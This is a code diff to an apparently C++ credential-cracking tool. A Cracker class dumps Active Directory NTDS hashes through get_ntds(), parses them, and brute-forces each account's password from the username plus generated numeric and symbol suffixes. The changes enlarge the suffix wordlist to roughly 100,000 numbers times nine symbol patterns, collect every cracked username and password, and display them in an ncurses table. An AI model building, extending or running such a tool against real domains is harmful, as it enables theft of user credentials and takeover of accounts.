@@ -13,13 +13,16 @@ using namespace std;
 
 class Cracker {
     public:
+        string ip_address;
+        string username;
+        string password;
         string target;
 
         std::vector<string> generate(string username) {
             std::vector<string> usernames;
             std::string busername = username;
-
-            for (const auto& extension : extensions) {    
+            std::vector<string> mixed_extensions = extender(extensions);
+            for (const auto& extension : mixed_extensions) {    
                 username.append(extension);
                 usernames.push_back(username);
                 username = busername;
@@ -99,30 +102,38 @@ class Cracker {
             return creds;
         }
 
-        std::string launch() {
+        std::vector<string> launch() {
             std::string output = get_ntds();
             std::unordered_map<std::string, std::string> creds = parse_hashes(output);
+            std::vector<string> resp;
+            std::pair<bool, string> crack_status;
             for (const auto& kv : creds) {
+                crack_status = std::make_pair(false, "");
                 std::vector<string> wl = generate(kv.first);
-                std::pair<bool, string> crack_status = crack(wl, kv.second.c_str());
-                // std::cout << kv.second.c_str() << std::endl;
+                crack_status = crack(wl, kv.second.c_str());
                 if (crack_status.first) {
-                    std::string resp = "Password Cracked: username is " +
+                    resp.push_back("Username: " +
                         kv.first +
-                        " password is " +
-                        crack_status.second;
-                        return resp;
+                        " & Password: " +
+                        crack_status.second);
                 }
             }
-            return std::string();
+            return resp;
         }
 
     private:
         std::vector<std::string> extensions = {
-            "123",
-            "1234",
-            "12345",
             "123456",
+            "654321",
+            "1234567",
+            "7654321",
+            "12345678",
+            "87654321",
+            "123456789",
+            "987654321",
+            "1234567890",
+            "0987654321",
+            "000",
             "001",
             "002",
             "003",
@@ -132,6 +143,26 @@ class Cracker {
             "008",
             "009"
     };
+
+    std::vector<std::string> extender(std::vector<std::string> initial_extensions){
+        std::vector<std::string> extensions;
+        for (int i = 1; i < 99999; i++) {
+            std::string str_i = std::to_string(i);
+            extensions.push_back(str_i);
+            extensions.push_back(str_i + "!");
+            extensions.push_back(str_i + "!!");
+            extensions.push_back(str_i + "!!!");
+            extensions.push_back(str_i + "@");
+            extensions.push_back(str_i + "!@#");
+            extensions.push_back(str_i + "!@");
+            extensions.push_back(str_i + "!@#$%");
+            extensions.push_back(str_i + "!@#$%^");
+        }
+        initial_extensions.insert(initial_extensions.end(), 
+                                    extensions.begin(), 
+                                    extensions.end());
+        return initial_extensions;
+    }
 };
 
 int main() {
@@ -177,14 +208,22 @@ int main() {
     // use target value
     Cracker C;
     C.target = target;
-    std::string response = C.launch();
-    int response_len = response.length();
-    int response_x = (COLS - response_len) / 2;
+    std::vector<string> response = C.launch();
     int response_y = LINES / 2 + 2;
-    mvprintw(response_y, response_x, "%s", response.c_str());
+    int response_x = 2; // starting position of the table
+
+    // print table headers
+    attron(COLOR_PAIR(4));
+    mvprintw(response_y, response_x, "%-10s %-20s", "Status", "Response");
+    response_y++;
+
+    for (const auto& resp : response) {
+        attron(COLOR_PAIR(5));
+        mvprintw(response_y, response_x, "%-10s %-20s", "Cracked", resp.c_str());
+        response_y++;
+    }
     refresh();
     getch();
-
     // clean up ncurses and exit
     endwin();
     return 0;
